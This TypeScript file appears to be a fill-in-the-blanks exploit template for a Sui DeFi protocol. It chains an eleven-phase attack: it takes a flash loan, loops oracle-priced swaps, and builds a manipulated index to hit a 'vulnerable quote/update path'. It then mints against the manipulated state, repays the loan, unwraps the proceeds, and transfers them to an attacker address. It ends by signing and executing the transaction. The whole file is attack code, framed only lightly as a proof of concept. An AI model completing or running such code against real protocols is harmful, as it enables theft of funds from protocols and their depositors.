import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction, TransactionResult } from '@mysten/sui/transactions';

type SuiNetwork = 'mainnet' | 'testnet' | 'devnet' | 'localnet';

const CONFIG = {
  privateKey: process.env.SUI_PRIVATE_KEY ?? '<SUI_PRIVATE_KEY>',
  network: (process.env.SUI_NETWORK ?? '<SUI_NETWORK>') as SuiNetwork,
  targets: {
    initPosition: '<TARGET_PACKAGE>::<POSITION_MODULE>::<INIT_POSITION_FUNCTION>',
    borrowFlashAsset: '<TARGET_PACKAGE>::<FLASHLOAN_MODULE>::<BORROW_FUNCTION>',
    queryOraclePrice: '<ORACLE_PACKAGE>::<ORACLE_MODULE>::<GET_PRICE_FUNCTION>',
    swapExactInput: '<TARGET_PACKAGE>::<MARKET_MODULE>::<SWAP_EXACT_INPUT_FUNCTION>',
    createRawIndex: '<MATH_PACKAGE>::<MATH_MODULE>::<CREATE_FROM_RAW_VALUE_FUNCTION>',
    quoteManipulatedMint: '<TARGET_PACKAGE>::<POSITION_MODULE>::<QUOTE_MANIPULATED_MINT_FUNCTION>',
    mintWithManipulatedState: '<TARGET_PACKAGE>::<MINT_MODULE>::<MINT_FUNCTION>',
    repayFlashAsset: '<TARGET_PACKAGE>::<FLASHLOAN_MODULE>::<REPAY_FUNCTION>',
    redeemIntermediateAsset: '<TARGET_PACKAGE>::<INTERMEDIATE_ASSET_MODULE>::<REDEEM_FUNCTION>',
    burnWrappedAsset: '<WRAPPER_PACKAGE>::<WRAPPER_MODULE>::<BURN_FUNCTION>',
    finalRedeem: '<REDEEM_PACKAGE>::<REDEEM_MODULE>::<REDEEM_FUNCTION>',
  },
  objects: {
    market: '<MARKET_OBJECT_ID>',
    state: '<STATE_OBJECT_ID>',
    clock: '<CLOCK_OBJECT_ID>',
    oracleConfig: '<ORACLE_CONFIG_OBJECT_ID>',
    oracleState: '<ORACLE_STATE_OBJECT_ID>',
    oracleFeed: '<ORACLE_FEED_OBJECT_ID>',
    oracleVersion: '<ORACLE_VERSION_OBJECT_ID>',
    collateralVault: '<COLLATERAL_VAULT_OBJECT_ID>',
    liquidityPool: '<LIQUIDITY_POOL_OBJECT_ID>',
    mintCap: '<MINT_CAP_OBJECT_ID>',
    wrapperState: '<WRAPPER_STATE_OBJECT_ID>',
  },
  recipients: {
    attacker: '<ATTACKER_ADDRESS>',
  },
  amounts: {
    flashLoanAmount: '<FLASH_LOAN_AMOUNT_U64>',
    swapInputAmount: '<SWAP_INPUT_AMOUNT_U64>',
    minSwapOutput: '<MIN_SWAP_OUTPUT_U64>',
    splitMintAmount: '<SPLIT_MINT_AMOUNT_U64>',
    manipulatedIndexRaw: '<MANIPULATED_INDEX_RAW_U128>',
    loopCount: '<LOOP_COUNT>',
    exactOutputAmount: '<EXACT_OUTPUT_AMOUNT_U64>',
  },
};

function requireFilled(value: string, label: string): string {
  if (value.startsWith('<') && value.endsWith('>')) {
    throw new Error(`Replace placeholder for ${label}: ${value}`);
  }
  return value;
}

function asU64(value: string, label: string): bigint {
  return BigInt(requireFilled(value, label));
}

function asU128(value: string, label: string): bigint {
  return BigInt(requireFilled(value, label));
}

function asLoopCount(value: string, label: string): number {
  const parsed = Number.parseInt(requireFilled(value, label), 10);
  if (!Number.isFinite(parsed) || parsed <= 0) {
    throw new Error(`Invalid numeric value for ${label}: ${value}`);
  }
  return parsed;
}

function objectArg(tx: Transaction, value: string, label: string) {
  return tx.object(requireFilled(value, label));
}

function buildOracleArgs(tx: Transaction) {
  return [
    objectArg(tx, CONFIG.objects.oracleConfig, 'oracleConfig'),
    objectArg(tx, CONFIG.objects.oracleState, 'oracleState'),
    objectArg(tx, CONFIG.objects.oracleFeed, 'oracleFeed'),
    objectArg(tx, CONFIG.objects.oracleVersion, 'oracleVersion'),
    objectArg(tx, CONFIG.objects.collateralVault, 'collateralVault'),
    objectArg(tx, CONFIG.objects.clock, 'clock'),
  ];
}

async function main() {
  const privateKey = requireFilled(CONFIG.privateKey, 'privateKey');
  const network = requireFilled(CONFIG.network, 'network') as SuiNetwork;

  const { secretKey } = decodeSuiPrivateKey(privateKey);
  const keypair = Ed25519Keypair.fromSecretKey(secretKey);
  const client = new SuiClient({ url: getFullnodeUrl(network) });

  const tx = new Transaction();
  const intermediateCoins: TransactionResult[] = [];
  const loopCount = asLoopCount(CONFIG.amounts.loopCount, 'loopCount');

  // Phase 1: initialize the attacker-controlled position.
  const position = tx.moveCall({
    target: requireFilled(CONFIG.targets.initPosition, 'targets.initPosition'),
    arguments: [
      objectArg(tx, CONFIG.objects.market, 'market'),
      objectArg(tx, CONFIG.objects.state, 'state'),
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  // Phase 2: borrow the flash-loaned asset needed to start the exploit.
  const [_borrowedAmount, flashLoanReceipt] = tx.moveCall({
    target: requireFilled(CONFIG.targets.borrowFlashAsset, 'targets.borrowFlashAsset'),
    arguments: [
      position,
      tx.pure.u64(asU64(CONFIG.amounts.flashLoanAmount, 'flashLoanAmount')),
      objectArg(tx, CONFIG.objects.state, 'state'),
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  // Phase 3: repeatedly swap into the intermediate asset used by the exploit.
  for (let i = 0; i < loopCount; i += 1) {
    const price = tx.moveCall({
      target: requireFilled(CONFIG.targets.queryOraclePrice, 'targets.queryOraclePrice'),
      arguments: buildOracleArgs(tx),
    });

    const coin = tx.moveCall({
      target: requireFilled(CONFIG.targets.swapExactInput, 'targets.swapExactInput'),
      arguments: [
        objectArg(tx, CONFIG.objects.market, 'market'),
        tx.pure.u64(asU64(CONFIG.amounts.swapInputAmount, 'swapInputAmount')),
        tx.pure.u64(asU64(CONFIG.amounts.minSwapOutput, 'minSwapOutput')),
        position,
        objectArg(tx, CONFIG.objects.state, 'state'),
        price,
        objectArg(tx, CONFIG.objects.collateralVault, 'collateralVault'),
        objectArg(tx, CONFIG.objects.liquidityPool, 'liquidityPool'),
        objectArg(tx, CONFIG.objects.clock, 'clock'),
      ],
    });

    intermediateCoins.push(coin);
  }

  if (intermediateCoins.length === 0) {
    throw new Error('Set loopCount to a value greater than zero.');
  }

  // Phase 4: merge the intermediate assets into a single coin for later use.
  tx.mergeCoins(intermediateCoins[0], intermediateCoins.slice(1));

  // Phase 5: construct the manipulated index or pricing primitive.
  const manipulatedIndex = tx.moveCall({
    target: requireFilled(CONFIG.targets.createRawIndex, 'targets.createRawIndex'),
    arguments: [
      tx.pure.u128(asU128(CONFIG.amounts.manipulatedIndexRaw, 'manipulatedIndexRaw')),
    ],
  });

  // Phase 6: call the vulnerable quote/update path with the manipulated index.
  tx.moveCall({
    target: requireFilled(CONFIG.targets.quoteManipulatedMint, 'targets.quoteManipulatedMint'),
    arguments: [
      tx.pure.u64(asU64(CONFIG.amounts.exactOutputAmount, 'exactOutputAmount')),
      manipulatedIndex,
      objectArg(tx, CONFIG.objects.state, 'state'),
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  const refreshedPrice = tx.moveCall({
    target: requireFilled(CONFIG.targets.queryOraclePrice, 'targets.queryOraclePrice'),
    arguments: buildOracleArgs(tx),
  });

  // Phase 7: split the intermediate asset so a controlled amount is used in minting.
  const splitCoin = tx.splitCoins(intermediateCoins[0], [
    tx.pure.u64(asU64(CONFIG.amounts.splitMintAmount, 'splitMintAmount')),
  ]);

  // Phase 8: mint using the manipulated state.
  tx.moveCall({
    target: requireFilled(
      CONFIG.targets.mintWithManipulatedState,
      'targets.mintWithManipulatedState',
    ),
    arguments: [
      objectArg(tx, CONFIG.objects.market, 'market'),
      splitCoin,
      refreshedPrice,
      position,
      objectArg(tx, CONFIG.objects.state, 'state'),
      objectArg(tx, CONFIG.objects.mintCap, 'mintCap'),
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  // Phase 9: repay the flash loan to close the same-transaction loop.
  tx.moveCall({
    target: requireFilled(CONFIG.targets.repayFlashAsset, 'targets.repayFlashAsset'),
    arguments: [
      position,
      objectArg(tx, CONFIG.objects.state, 'state'),
      flashLoanReceipt,
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  // Phase 10: redeem and unwrap the manipulated proceeds.
  const intermediateRedeemCoin = tx.moveCall({
    target: requireFilled(
      CONFIG.targets.redeemIntermediateAsset,
      'targets.redeemIntermediateAsset',
    ),
    arguments: [
      objectArg(tx, CONFIG.objects.market, 'market'),
      intermediateCoins[0],
      objectArg(tx, CONFIG.objects.collateralVault, 'collateralVault'),
    ],
  });

  const wrappedCoin = tx.moveCall({
    target: requireFilled(CONFIG.targets.burnWrappedAsset, 'targets.burnWrappedAsset'),
    arguments: [
      objectArg(tx, CONFIG.objects.wrapperState, 'wrapperState'),
      intermediateRedeemCoin,
    ],
  });

  const finalCoin = tx.moveCall({
    target: requireFilled(CONFIG.targets.finalRedeem, 'targets.finalRedeem'),
    arguments: [
      objectArg(tx, CONFIG.objects.oracleFeed, 'oracleFeed'),
      objectArg(tx, CONFIG.objects.oracleVersion, 'oracleVersion'),
      wrappedCoin,
      objectArg(tx, CONFIG.objects.clock, 'clock'),
    ],
  });

  // Phase 11: transfer the extracted asset and any useful state object.
  tx.transferObjects(
    [finalCoin, position],
    tx.pure.address(requireFilled(CONFIG.recipients.attacker, 'attacker')),
  );

  const result = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx,
    options: {
      showEffects: true,
      showObjectChanges: true,
    },
  });

  console.dir(result, { depth: null });
}

// This template is meant to be filled in and handed off as a PoC artifact.
// Running it is optional and depends on the target environment and user intent.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
